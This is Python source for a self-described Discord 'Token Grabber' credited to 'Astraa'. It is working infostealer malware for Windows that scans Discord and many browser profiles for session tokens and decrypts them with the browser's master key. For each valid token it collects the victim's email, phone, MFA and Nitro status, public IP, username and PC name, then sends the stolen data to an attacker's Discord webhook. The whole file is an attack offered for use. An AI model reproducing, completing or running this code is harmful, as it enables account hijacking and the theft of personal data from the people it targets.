from discord_webhook import DiscordWebhook
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime
import subprocess
import requests
import base64
import json
import re
import os

discord_tokens = []

__WEBHOOK__ = None # Replace with your discord webhook

LOCAL_APP = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')


def get_master_key(localstate):
    with open(localstate, "r") as l:
        return CryptUnprotectData(base64.b64decode(json.loads(l.read())['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]

def decrypt(buff, master_key):
    try: return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        try: return str(CryptUnprotectData(buff, None, None, None, 0)[1])
        except: return "Unsupported"

def get_public_ip():
    try: return requests.get('https://api.ipify.org').text
    except: pass

def get_wmic_uuid():
    p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def validate_discord_token(token):
    return requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': token}).status_code == 200

def main():
    if __WEBHOOK__ is None:
        print("Webhook is not set!"); return

    paths = {
        platform: path for platform, path in {
            'Discord': ROAMING + '\\discord',
            'Discord Canary': ROAMING + '\\discordcanary',
            'Lightcord': ROAMING + '\\Lightcord',
            'Discord PTB': ROAMING + '\\discordptb',
            'Opera': ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
            'Amigo': LOCAL_APP + '\\Amigo\\User Data',
            'Torch': LOCAL_APP + '\\Torch\\User Data',
            'Kometa': LOCAL_APP + '\\Kometa\\User Data',
            'Orbitum': LOCAL_APP + '\\Orbitum\\User Data',
            'CentBrowser': LOCAL_APP + '\\CentBrowser\\User Data',
            '7Star': LOCAL_APP + '\\7Star\\7Star\\User Data',
            'Sputnik': LOCAL_APP + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': LOCAL_APP + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': LOCAL_APP + '\\Google\\Chrome SxS\\User Data',
            'Chrome': LOCAL_APP + "\\Google\\Chrome\\User Data\\Default",
            'Epic Privacy Browser': LOCAL_APP + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': LOCAL_APP + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': LOCAL_APP + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': LOCAL_APP + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': LOCAL_APP + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': LOCAL_APP + '\\Iridium\\User Data\\Default'
        }.items() if os.path.exists(path)
    }

    for platform, path in paths.items():
        for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
            if os.path.splitext(file)[-1] not in [".log", ".ldb"]: continue # Easier to understand

            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", errors='ignore') as f:
                    for line in [x.strip() for x in f.readlines() if x.strip()]:
                        if "cord" not in path:
                            [discord_tokens.append(t) for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line) if validate_discord_token(t)]
                            continue

                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            localstate = path + "\\Local State"

                            token = decrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(localstate))
                            if token == "Unsupported" or not validate_discord_token(token): continue

                            discord_tokens.append(token)
            except PermissionError: continue

    webhook = DiscordWebhook(__WEBHOOK__)
    webhook.username = 'Token Grabber - Made by Astraa'
    webhook.avatar_url = 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'

    for token in list(set(discord_tokens)): # Remove duplicates
        discord_auth_headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try: res = requests.get('https://discordapp.com/api/v9/users/@me', headers=discord_auth_headers)
        except: continue

        if res.status_code != 200: continue

        user_data = res.json()
        public_ip = get_public_ip()

        pc_username = os.getenv("USERNAME")
        pc_name = os.getenv("COMPUTERNAME")
        user_name = f'{user_data["username"]}#{user_data["discriminator"]}'
        user_id = user_data['id']
        email = user_data['email']
        phone = user_data['phone']

        has_mfa_enabled = user_data['mfa_enabled']

        res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=discord_auth_headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)
        days_left_of_nitro = 0

        if has_nitro:
            nitro_end_date = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            nitro_start_date = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left_of_nitro = abs((nitro_end_date - nitro_start_date).days)

        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{has_mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left_of_nitro if days_left_of_nitro else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{public_ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{token}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""

        webhook.content = embed
        webhook.execute()

if __name__ == '__main__':
    main()